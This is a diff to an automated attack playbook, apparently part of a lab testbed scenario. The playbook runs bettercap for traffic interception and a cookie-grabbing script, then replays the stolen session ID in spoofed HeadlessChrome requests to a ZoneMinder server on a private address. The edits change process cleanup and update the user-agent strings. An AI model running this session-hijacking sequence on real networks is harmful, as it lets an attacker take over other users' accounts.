@@ -8,7 +8,7 @@ commands:
   - type: shell
     cmd: sudo bettercap -caplet bettercap.cap
     background: True
-    kill_on_exit: True
+    kill_on_exit: False
 
   - type: shell
     cmd: sudo /bin/python3 /home/aecid/scenario5/get_cookie.py
@@ -20,6 +20,9 @@ commands:
   - type: debug
     cmd: $SESSION_ID
 
+  - type: shell
+    cmd: sudo pkill -9 -f "bettercap -caplet bettercap.cap"
+
   - type: http-client
     cmd: GET
     url: http://172.17.100.121/zm/?view=options
@@ -27,7 +30,7 @@ commands:
       Host: "172.17.100.121"
       Connection: "keep-alive"
       Origin: "http://172.17.100.121"
-      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/127.0.6533.99 Safari/537.36"
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/129.0.0.0 Safari/537.36"
       Accept: "*/*"
       Referer: "http://172.17.100.121/zm/?view=login"
       Accept-Encoding: "gzip, deflate"
@@ -44,7 +47,7 @@ commands:
       Host: "172.17.100.121"
       Connection: "keep-alive"
       Origin: "http://172.17.100.121"
-      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/127.0.6533.99 Safari/537.36"
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/129.0.0.0 Safari/537.36"
       Accept: "*/*"
       Referer: "http://172.17.100.121/zm/?view=login"
       Accept-Encoding: "gzip, deflate"
@@ -61,7 +64,7 @@ commands:
       Host: "172.17.100.121"
       Connection: "keep-alive"
       Origin: "http://172.17.100.121"
-      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/127.0.6533.99 Safari/537.36"
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/129.0.0.0 Safari/537.36"
       Accept: "*/*"
       Referer: "http://172.17.100.121/zm/?view=login"
       Accept-Encoding: "gzip, deflate"
